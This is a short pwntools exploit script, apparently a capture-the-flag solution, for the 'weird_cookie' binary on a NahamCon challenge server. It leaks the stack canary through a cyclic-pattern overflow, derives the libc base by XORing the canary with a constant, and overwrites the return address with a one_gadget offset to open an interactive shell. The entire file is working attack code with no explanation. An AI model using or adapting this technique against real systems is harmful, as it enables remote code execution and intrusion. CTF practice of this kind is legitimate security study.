from pwn import *

context.terminal = "tmux splitw -h".split()
context.binary = elf = ELF('./weird_cookie')
libc = elf.libc
#p = elf.process()
p = remote('challenge.nahamcon.com', 31804)
x = """
b * main+116
"""
#gdb.attach(p,x)
p.send(cyclic(40))
p.recvuntil(cyclic(40))
canary = unpack(p.recvn(8),'all')
leak = (canary ^ 0x123456789abcdef1) - libc.sym.printf
print(hex(leak))

p.send(cyclic(40) + p64(canary) + p64(0) + p64(leak + 0x4f2a5))
p.interactive()
